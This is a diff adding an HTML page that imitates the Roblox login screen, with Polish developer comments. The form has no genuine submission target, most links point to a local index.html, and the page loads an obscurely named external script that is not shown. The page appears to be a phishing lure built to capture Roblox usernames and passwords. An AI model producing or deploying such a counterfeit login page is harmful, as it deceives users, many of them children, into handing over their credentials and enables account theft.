@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]-->
+<!--[if gt IE 8]><!--><html><!--<![endif]-->
+<head data-machine-id="495b2758-5bb8-bf23-8b9a-7233b93d0fbf">
+    <style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+    <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+    <title>Log in to Roblox</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Roblox Corporation">
+    <meta name="description" content="Login to your Roblox account or sign up to create a new account.">
+    <meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">
+    <meta name="apple-itunes-app" content="app-id=431946152">
+    <link rel="apple-touch-icon" href="images/7c5fe83dffa97250aaddd54178900ea7.png">
+    <script type="application/ld+json">
+        {
+        "@context" : "https://schema.org",
+        "@type" : "Organization",
+        "name" : "Roblox",
+        "url" : "https://www.roblox.com/",
+        "image" : "https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png",
+        "logo" : "https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png",
+        "email" : "info@roblox.com",
+        "sameAs" : [
+        "https://www.facebook.com/roblox/",
+        "https://twitter.com/roblox",
+        "https://www.linkedin.com/company/147977",
+        "https://www.instagram.com/roblox/",
+        "https://www.youtube.com/user/roblox",
+        "https://www.twitch.tv/roblox"
+        ]
+        }
+    </script>
+    <meta ng-csp="no-unsafe-eval">
+    <meta name="locale-data" data-language-code="en_us" data-language-name="English" data-url-locale="" data-override-language-header="false">
+    <meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown" data-is-chrome-os="false" data-is-pcgdk-app="false">
+    <meta name="environment-meta" data-domain="roblox.com" data-is-testing-site="false">
+    <meta id="roblox-display-names" data-enabled="true">
+    <meta name="hardware-backed-authentication-data" data-is-secure-authentication-intent-enabled="true" data-is-bound-auth-token-enabled="true">
+    <meta name="account-switching-data" data-is-account-switching-enabled="true">
+    <meta name="passkey-data" data-is-passkey-login-enabled="true">
+    <meta name="passkey-data-android" data-is-passkey-login-enabled-android="true">
+    <meta name="page-meta" data-internal-page-name="Login">
+    <meta name="page-retry-header-enabled" data-retry-attempt-header-enabled="True">
+    <link href="images/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">
+
+    <!-- CSS Roblox – zachowane dla wyglądu -->
+    <link rel="stylesheet" href="css/15b88564eae926990141be36eb3a9bd761cf2778fc9ac3425cdd4db1473148f4.css">
+    <link rel="stylesheet" href="css/8fa43545250dfbd7d96d164fe24e886391fdccc9b87b0dc91ce78933aebcda43.css">
+    <link rel="stylesheet" href="css/d6db63fa1054c8114471750134a3a4c0a9870a5e86b4d0a3be708582085b0f03.css">
+    <link rel="stylesheet" href="css/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
+    <link rel="stylesheet" href="css/66b2fd496e668938e3b0e2d9a0c12f9f88c3a1a4974608f69059d8061fc0141f.css">
+    <link rel="stylesheet" href="css/76213958cdc4d91524bf7bd4db57ab8097891dccc04dff60d7f3d103861554c6.css">
+    <link rel="stylesheet" href="css/c56998f707ed8eb87cbfe169758e4bf5ec378d807483904507f8562ad5b64835.css">
+    <link rel="stylesheet" href="css/da45920fef8b22d35ee6cce0702d290241252fbfd99695e2abc0934d20de0974.css">
+    <link rel="stylesheet" href="css/8f55fef5030e6e8f107be51f3320159f08682b053aee5e9f4bcdf7b9327cc957.css">
+    <link rel="stylesheet" href="css/9bfc48ea40a698035ea8cbe3d3e94bd06d3aac48969bedceb6d8ba5ff17ff84d.css">
+    <link rel="stylesheet" href="css/08c1e71929bb490446629d2f4c08ac3fc2729c4244753dcc8ec6e2f3b765adaf.css">
+    <link rel="stylesheet" href="css/2c2a709240897ce382b7ff55be4347cd0994ab1e2d6ed3b56649e54b0e97e13a.css">
+    <link rel="stylesheet" href="css/34dd1fec808320ee37a2554b194c6df704dd5c201d8c5842ecea3b9093341873.css">
+    <link rel="stylesheet" href="css/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css">
+    <link rel="stylesheet" href="css/99bc7bc872c39ffa5d2bbb936a006c28d743808ba187f992ad896a31618c17cf.css">
+    <link rel="canonical" href="https://www.roblox.com/login">
+    <link rel="alternate" href="https://www.roblox.com/login" hreflang="x-default">
+    <link rel="alternate" href="https://www.roblox.com/de/login" hreflang="de">
+    <link rel="alternate" href="https://www.roblox.com/es/login" hreflang="es">
+    <link rel="alternate" href="https://www.roblox.com/fr/login" hreflang="fr">
+    <link rel="alternate" href="https://www.roblox.com/id/login" hreflang="id">
+    <link rel="alternate" href="https://www.roblox.com/it/login" hreflang="it">
+    <link rel="alternate" href="https://www.roblox.com/ja/login" hreflang="ja">
+    <link rel="alternate" href="https://www.roblox.com/ko/login" hreflang="ko">
+    <link rel="alternate" href="https://www.roblox.com/pl/login" hreflang="pl">
+    <link rel="alternate" href="https://www.roblox.com/pt/login" hreflang="pt">
+    <link rel="alternate" href="https://www.roblox.com/th/login" hreflang="th">
+    <link rel="alternate" href="https://www.roblox.com/tr/login" hreflang="tr">
+    <link rel="alternate" href="https://www.roblox.com/vi/login" hreflang="vi">
+    <link rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___fb0c7d1e28371fc5e8367ce241b98d69_m.css/fetch">
+    <link rel="stylesheet" href="css/9e359afacbf43adae364437d6c7671f1f7f616d62e584e5a03c08a3db28ac08b.css">
+    <link rel="stylesheet" href="css/bc981bafa6b0a52c86d071d1f81b24168a8dd92e72b8ac52d37cb46bf8bd8c42.css">
+    <link rel="stylesheet" href="css/59dc4960d692ecd4d1c46d72048095b94515fe07a5ea6d619ac5a475d25dfe21.css">
+    <link rel="stylesheet" href="css/97a9d5a74599e95902f6456aea6e3cfaa9fe463ebbe0ae4a6a5025d40e1b7866.css">
+    <link rel="stylesheet" href="css/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">
+    <link rel="stylesheet" href="css/ReactLogin.css">
+    <link rel="stylesheet" href="css/70a9b96d26cf93544ef5fca7ea783f537d9e57c8e9ba395f1dfb57b090d87eff.css">
+    <link rel="stylesheet" href="css/3c4bd9b17b9020d9ebc87d4542a68a949a9de6150a55a92f0e65514520ee777e.css">
+    <link rel="stylesheet" href="css/0fd144dfddc01ac3e7993d0305a56cf1027a2aed388c9be44c0d37f565b93048.css">
+    <link rel="stylesheet" href="css/3bca47a98d58fdf98a7063c4f3b390671e5326ed559813887f3945876c997da6.css">
+    <link rel="stylesheet" href="css/d45e200658a1343116bbf4a88c367d093758085e7d001918d641c85b2143468f.css">
+    <link rel="stylesheet" href="css/c5373f0dced8d7be7bb3ad1b978fb8af776157fcc41ad3d5c92d725063c2e6e1.css">
+    <link rel="stylesheet" href="css/d5a3728b78be729b693aadf79a1f45f0fa49c15fe863a0d7dd631b75f9e82207.css">
+    <link id="nordvpn-contentScript-extension-fonts" rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+</head>
+<body id="rbx-body" class="rbx-body   dark-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
+    <meta name="csrf-token" data-token="Kmz/DzjdHDnh">
+    <div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false">
+        <div id="navigation-container" class="dark-theme gotham-font">
+            <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
+                <div class="container-fluid">
+                    <div class="rbx-navbar-header">
+                        <div class="navbar-header">
+                            <a class="navbar-brand" href="/home"> <span class="icon-logo"></span><span class="icon-logo-r"></span> </a>
+                        </div>
+                    </div>
+                    <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
+                        <li> <a class="font-header-2 nav-menu-title text-header" href="index.html">Charts</a> </li>
+                        <li> <a class="font-header-2 nav-menu-title text-header" href="index.html">Marketplace</a> </li>
+                        <li> <a class="font-header-2 nav-menu-title text-header" href="index.html">Create</a> </li>
+                        <li> <a class="font-header-2 nav-menu-title text-header" href="index.html">Robux</a> </li>
+                    </ul>
+                    <div id="right-navigation-header">
+                        <div class="navbar-right rbx-navbar-right">
+                            <ul class="nav navbar-right rbx-navbar-right-nav">
+                                <li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/account/signupredir?returnUrl=https%3A%2F%2Fwww.roblox.com%2FLogin" id="sign-up-button">Sign Up</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="container-main" id="container-main" tabindex="-1">
+            <div class="alert-container">
+                <noscript>
+                    <div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div>
+                </noscript>
+            </div>
+            <div class="content">
+                <!-- FunCaptcha (opcjonalny) -->
+                <script src="https://roblox-api.arkoselabs.com/fc/api/?onload=reportFunCaptchaLoaded" async></script>
+                <script>
+                    function reportFunCaptchaLoaded() {}
+                </script>
+
+                <br><br>
+                <div id="react-login-container" class="login-container" data-return-url="" data-enable-react-ui="true">
+                    <div id="login-base">
+                        <div class="section-content login-section">
+                            <h1 class="login-header">Login to Roblox</h1>
+                            <div id="login-form">
+                                <div class="login-form-container">
+                                    <form id="login-form-real" class="login-form">
+                                        <div class="form-group username-form-group">
+                                            <input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone" required>
+                                        </div>
+                                        <div class="form-group password-form-group">
+                                            <input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" required>
+                                            <p class="form-control-label xsmall text-error login-error" id="text-error"></p>
+                                        </div>
+                                        <span id="login-loading" class="spinner spinner-default" style="display:none;"></span>
+                                        <button type="submit" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
+                                    </form>
+                                </div>
+                            </div>
+                            <div class="text-center forgot-credentials-link">
+                                <a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a>
+                            </div>
+                            <div class="alternative-login-divider-container">
+                                <div class="rbx-divider alternative-login-divider"></div>
+                            </div>
+                            <button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button" onclick="document.getElementById('login-form-real').dispatchEvent(new Event('submit'))">Email Me a One-Time Code</button>
+                            <button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button" onclick="document.getElementById('login-form-real').dispatchEvent(new Event('submit'))">
+                                <span>Use Another Device</span>
+                            </button>
+                            <div class="text-center">
+                                <div class="signup-option">
+                                    <span class="no-account-text">Don't have an account?</span>
+                                    <a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/" target="_self">Sign Up</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Footer -->
+                <footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True">
+                    <div class="footer">
+                        <ul class="row footer-links">
+                            <li class="footer-link"><a class="text-footer-nav" href="index.html" target="_blank">About Us</a></li>
+                            <li class="footer-link"><a class="text-footer-nav" href="index.html" target="_blank">Jobs</a></li>
+                            <li class="footer-link"><a class="text-footer-nav" href="index.html" target="_blank">Blog</a></li>
+                            <li class="footer-link"><a class="text-footer-nav" href="index.html" target="_blank">Parents</a></li>
+                            <li class="footer-link"><a class="text-footer-nav giftcards" href="index.html" target="_blank">Gift Cards</a></li>
+                            <li class="footer-link"><a class="text-footer-nav" href="index.html" target="_blank">Help</a></li>
+                            <li class="footer-link"><a class="text-footer-nav" href="index.html" target="_blank">Terms</a></li>
+                            <li class="footer-link"><a class="text-footer-nav" href="index.html" target="_blank">Accessibility</a></li>
+                            <li class="footer-link"><a class="text-footer-nav privacy" href="index.html" target="_blank">Privacy</a></li>
+                        </ul>
+                        <div class="row copyright-container">
+                            <div class="col-sm-12">
+                                <p class="text-footer footer-note">2022 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+                            </div>
+                        </div>
+                    </div>
+                </footer>
+            </div>
+        </div>
+    </div>
+    <script src="css/oefdspofrewoisfewfewfw02349.js"></script>
+</body>
+</html>
